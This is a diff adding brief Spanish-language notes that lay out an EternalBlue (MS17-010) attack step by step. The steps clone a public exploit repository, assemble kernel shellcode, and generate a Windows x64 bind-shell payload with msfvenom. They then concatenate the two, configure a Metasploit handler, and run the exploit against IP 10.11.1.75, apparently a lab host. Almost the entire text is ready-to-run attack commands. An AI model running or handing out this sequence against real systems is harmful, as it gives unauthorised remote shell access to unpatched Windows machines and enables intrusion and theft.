@@ -1,0 +1,27 @@
+=============================
+
+
+Eternal Blue:
+
+Nota: ejecutar todo dentro de carpeta MS17-010
+
+1) Git clone https://github.com/worawit/MS17-010.git
+
+2) Compilar Binario: nasm -f bin shellcode/eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
+
+3)Generar Payload: msfvenom -p windows/x64/shell/bind_tcp -f raw -o sc_x64_msf.bin lhost=10.11.0.39 lport=4445 EXITFUNC=thread
+
+4) Modificar Binario / shellcode: cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
+
+5) Ejecutar listener: msfconsole // use exploit/multi/handler/bind_TCP
+
+a) set lport 4445
+b) set rhost 10.11.1.75
+c) set exitfunc thread
+d) exploit
+
+6) ejecutar exploit: python eternalblue_exploit7.py 10.11.1.75 sc_x64.bin
+
+
+
+
